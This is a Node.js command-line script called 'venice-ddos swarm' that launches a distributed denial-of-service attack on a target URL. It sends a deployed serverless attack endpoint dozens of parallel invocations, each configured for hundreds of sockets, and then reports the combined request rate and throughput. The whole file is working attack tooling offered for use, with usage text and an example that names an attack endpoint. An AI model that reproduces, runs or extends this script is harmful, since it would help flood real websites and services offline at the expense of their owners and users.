#!/usr/bin/env node
'use strict';

function parseArgs(argv) {
  const out = { _: [] };
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (!a.startsWith('--')) { out._.push(a); continue; }
    const key = a.slice(2);
    const next = argv[i + 1];
    if (next === undefined || next.startsWith('--')) out[key] = true;
    else { out[key] = next; i++; }
  }
  return out;
}

const argv = parseArgs(process.argv.slice(2));
const endpoint = argv.endpoint || argv.e || argv._[0];
const target = argv.target || argv.t || argv._[1];

if (!endpoint || !target) {
  console.log(`
  venice-ddos swarm — fan one attack across many serverless instances

  Usage:
    node swarm.js <deployed-endpoint> <target> [options]

  Options:
    --instances <n>    parallel invocations, default 20
    --method <id>      default: all
    --duration <sec>   default: 25
    --concurrency <n>  sockets per instance, default 800
    --ramp <ms>        delay between launches, default 250

  Example:
    node swarm.js https://my-ddos.vercel.app/api/attack https://example.com \\
      --instances 30 --method all --duration 30 --concurrency 800
`);
  process.exit(0);
}

const instances = Math.max(1, Number(argv.instances) || 20);
const duration = Math.max(1, Number(argv.duration) || 25);
const concurrency = Math.max(1, Number(argv.concurrency) || 800);
const method = argv.method || 'all';
const ramp = Math.max(0, Number(argv.ramp) || 250);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function fire(i) {
  const u = new URL(endpoint);
  u.searchParams.set('target', target);
  u.searchParams.set('method', method);
  u.searchParams.set('duration', String(duration));
  u.searchParams.set('concurrency', String(concurrency));
  try {
    const res = await fetch(u, { headers: { 'x-swarm-instance': String(i) } });
    const body = await res.json();
    if (!body.ok) return { i, ok: false, error: body.error || `HTTP ${res.status}` };
    return { i, ok: true, result: body };
  } catch (e) {
    return { i, ok: false, error: e.message };
  }
}

(async () => {
  console.log(`Endpoint: ${endpoint}`);
  console.log(`Target:   ${target}`);
  console.log(`Plan:     ${instances} instances x ${concurrency} sockets = ${(instances * concurrency).toLocaleString()} sockets`);
  console.log(`Method:   ${method}   Duration: ${duration}s\n`);

  const promises = [];
  for (let i = 0; i < instances; i++) {
    promises.push(fire(i));
    if (ramp) await sleep(ramp);
  }

  console.log(`All ${instances} instances launched. Waiting...\n`);
  const results = await Promise.all(promises);
  const good = results.filter((r) => r.ok);

  const agg = good.reduce((a, r) => {
    a.requests += r.result.totals.requests;
    a.errors += r.result.totals.errors;
    a.bytes += r.result.totals.bytesReceived;
    a.peakRps += r.result.peak.rps;
    a.peakMbps += r.result.peak.mbps;
    return a;
  }, { requests: 0, errors: 0, bytes: 0, peakRps: 0, peakMbps: 0 });

  console.log('— SWARM RESULT —');
  console.log(`instances ok:    ${good.length}/${instances}`);
  console.log(`total requests:  ${agg.requests.toLocaleString()}`);
  console.log(`total errors:    ${agg.errors.toLocaleString()}`);
  console.log(`data received:   ${(agg.bytes / 1073741824).toFixed(3)} GB`);
  console.log(`avg req/s:       ${Math.round(agg.requests / duration).toLocaleString()}`);
  console.log(`avg throughput:  ${((agg.bytes * 8) / 1e6 / duration).toFixed(1)} Mbps`);
  console.log(`effective:       ${((agg.bytes * 8) / 1e9 / duration).toFixed(3)} Gbps`);
  console.log(`summed peak:     ${Math.round(agg.peakRps).toLocaleString()} req/s | ${agg.peakMbps.toFixed(1)} Mbps`);

  const failed = results.filter((r) => !r.ok);
  if (failed.length) {
    console.log(`\nfailures (${failed.length}):`);
    failed.slice(0, 10).forEach((f) => console.log(`  #${f.i}: ${f.error}`));
  }
})();
